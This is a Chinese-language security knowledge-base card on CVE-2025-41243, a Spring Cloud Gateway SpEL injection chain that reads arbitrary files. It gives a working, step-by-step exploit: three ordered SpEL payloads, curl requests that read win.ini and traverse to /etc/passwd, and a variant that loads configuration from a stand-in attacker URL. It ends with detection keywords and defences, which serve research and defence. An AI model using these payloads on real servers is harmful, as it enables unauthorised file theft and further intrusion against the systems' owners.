---
id: web-java-expression-spel-spring-cloud-gateway-property-method-chain
title: Spring Cloud Gateway SpEL 属性写 + 方法名兜底调用链实现任意文件读取
type: scenario
domain: web
path: web/java/expression/spel
technique: spel-property-method-fallback-file-read
tags:
- java
- spring
- spring-cloud-gateway
- spel
- expression-injection
- arbitrary-file-read
- reflection
- cve-2025-41243
cve:
- CVE-2025-41243
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:20:31+08:00'
  notes: 已对照原文核对：CVE-2022-22947 修复后的 SimpleEvaluationContext/RestrictivePropertyAccessor、@systemProperties Map 索引读写不受限、关闭 restrictive-property-accessor、ReflectivePropertyAccessor.findGetterForProperty 属性名作方法名兜底、resourceHandlerMapping.urlMap locationValues 改写与 afterPropertiesSet 刷新、/webjars/Windows/win.ini 读文件均与原文一致；卡片写入的完整键 spring.cloud.gateway.server.webflux.restrictive-property-accessor.enabled 与原文源码一致（原文表达式处省略了 server.webflux 前缀）。补充的 curl /webjars/../../etc/passwd 为原文未给出的 Linux 外推示例，未验证；文件读取已由原文 Windows 用例证成。原文未给受影响版本区间，未设置 versions。PoC 未在本机执行。
url: /docs/web/java/expression/spel/web-java-expression-spel-spring-cloud-gateway-property-method-chain/
draft: false
kb_aliases:
- CVE-2025-41243
- Spring Cloud Gateway SpEL 注入
- resourceHandlerMapping 文件读取
- afterPropertiesSet 方法名兜底
- 受限属性访问器绕过
- Gateway 热更新 SpEL
---

## 一句话结论

Spring Cloud Gateway 热更新路由时执行的 SpEL 在 CVE-2022-22947 修复后仍暴露 bean map 与 `ReflectivePropertyAccessor` 的“属性名当方法名”兜底：先用 `@systemProperties` 关闭限制性属性访问器，再改写 `resourceHandlerMapping` 的静态资源路径并调用其 `afterPropertiesSet` 刷新，即可通过 `/webjars/**` 下载服务器任意文件（CVE-2025-41243）。

## 原理

- 触发面与 CVE-2022-22947 相同：通过 Gateway actuator 添加/刷新路由时，filter 的 shortcut 参数会经 `ShortcutConfigurable.normalize()` 用 SpEL 求值，攻击者可提交 `#{...}` 表达式。
- 2022 年的修复把 `StandardEvaluationContext` 换成 `SimpleEvaluationContext`，限制 bean 解析、类型访问与方法解析；但 `GatewayEvaluationContext` 仍保留 `BeanFactoryResolver`，且新的 `RestrictivePropertyAccessor` 只限制普通属性读取。
- SpEL 对 Map 的索引访问不走同一套属性限制：`@myMap['my.flag']` 可任意读写，而 `@myMap['my.flag'].abc` 才被限制。`@systemProperties`、`@systemEnvironment` 正是可写的系统属性/环境变量 Map。
- 第一步写入 `systemProperties`：把 `spring.cloud.gateway.server.webflux.restrictive-property-accessor.enabled` 设为 `false`，后续求值改用 `SimpleEvaluationContext.forReadOnlyDataBinding()`，解除属性读取限制（仍不能任意调用 bean 方法）。
- 第二步利用 `ReflectivePropertyAccessor.read()`：当属性名不是字段/getter 时，`findGetterForProperty()` 会以属性名本身作为方法名兜底查找无参公开方法，因此表达式里写 `.afterPropertiesSet` 实际调用了 `ResourceWebHandler.afterPropertiesSet()`。
- `ResourceWebHandler.afterPropertiesSet()` 调用 `resolveResourceLocations()`，用当前 `locationValues` 重建 `locationsToUse`；先通过 `@resourceHandlerMapping.urlMap['/webjars/**'].locationValues[0]='file:///C:/'` 把资源目录改成文件系统根，再触发刷新，静态资源映射即可读取磁盘任意文件。
- 三步组合即完整链：写系统属性关闭限制 → 写 `locationValues` → 方法名兜底调用 `afterPropertiesSet` 生效 → 通过 `/webjars/**` 下载文件。

## 触发条件

- 目标使用受影响的 Spring Cloud Gateway，且 Gateway actuator 路由管理接口可达（或存在其他能把 SpEL 送入路由定义/刷新的入口）；
- 攻击者能提交含 `#{...}` 的 filter 参数并触发路由刷新（如 `POST /actuator/gateway/routes/{id}` + `POST /actuator/gateway/refresh`）；
- 目标未应用 CVE-2025-41243 补丁（补丁在 SimpleEvaluationContext 上增加 `withAssignmentDisabled()`）；
- 进程对目标文件有读权限，且 `resourceHandlerMapping` bean 存在并映射了静态资源路径。

## 利用步骤

1. 确认 Gateway actuator 可达，按 CVE-2022-22947 的方式向路由 filter 参数注入 SpEL，并触发 refresh。
2. 提交表达式 1，关闭限制性属性访问器：
   ```text
   #{@systemProperties['spring.cloud.gateway.server.webflux.restrictive-property-accessor.enabled']='false'}
   ```
3. 提交表达式 2，把 `/webjars/**` 的静态资源目录改为文件系统根（Windows 用 `file:///C:/`，Linux 用 `file:///`）：
   ```text
   #{@resourceHandlerMapping.urlMap['/webjars/**'].locationValues[0]='file:///C:/'}
   ```
4. 提交表达式 3，利用属性名兜底调用 `afterPropertiesSet` 刷新资源映射：
   ```text
   #{@resourceHandlerMapping.urlMap['/webjars/**'].afterPropertiesSet}
   ```
5. 访问静态资源路径读取文件：
   ```bash
   curl http://target:8080/webjars/Windows/win.ini
   curl http://target:8080/webjars/../../etc/passwd
   ```

## PoC

三个 SpEL 表达式（按顺序在路由热更新中执行）：

```text
#{@systemProperties['spring.cloud.gateway.server.webflux.restrictive-property-accessor.enabled']='false'}
#{@resourceHandlerMapping.urlMap['/webjars/**'].locationValues[0]='file:///C:/'}
#{@resourceHandlerMapping.urlMap['/webjars/**'].afterPropertiesSet}
```

验证：

```bash
curl http://127.0.0.1:8080/webjars/Windows/win.ini
```

原文响应：

```ini
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
```

成功标志：通过静态资源 URL 读到目标磁盘任意文件。

## 变体与关联

- 变体：把路径改为 `file:///` 读取 Linux 根目录；把 `afterPropertiesSet` 换成其他 bean 的无参公开方法，可触发不同副作用。
- 变体：用 `@refreshEndpoint.refresh` 配合 `@systemProperties['spring.config.import']='optional:http://attacker/1.yml'` 让 Spring 从外部 URL 重载配置；需用三元表达式设置 guard 属性避免刷新死循环。原文验证了外部配置被请求，但高版本安全 YAML 环境未能进一步 RCE。
- 变体：`spring.cloud.gateway.discovery.locator` 的 `urlExpression`/`includeExpression` 也可执行 SpEL，但上下文为 `forReadOnlyDataBinding().withInstanceMethods()`，不能访问 bean，利用面有限。
- 关联：[[web-java-expression-spel-injection-to-rce]]（SpEL 注入通用原理）；[[web-java-expression-spel-restricted-reflection-memshell]]（受限上下文下的反射利用）。
- 边界：补丁版本、actuator 不可达、`resourceHandlerMapping` 不存在、或限制性属性访问器无法关闭时，本链不成立。

## 检测与防御

- 检测：请求中出现 `#{`、`@systemProperties`、`@systemEnvironment`、`resourceHandlerMapping`、`locationValues`、`afterPropertiesSet`、`refreshEndpoint` 等特征。
- 检测：路由定义/热更新请求包含 SpEL；`/actuator/gateway/*` 被外部访问；静态资源路径返回系统文件内容。
- 防御：升级到修复 CVE-2025-41243 的 Spring Cloud Gateway 版本（补丁禁用赋值表达式）；actuator 端点仅内网/认证可达或关闭 gateway 管理端点。
- 加固：禁止外部提交路由定义；对 SpEL 输入做白名单/禁用 `#{`；限制进程文件读权限；最小权限运行。
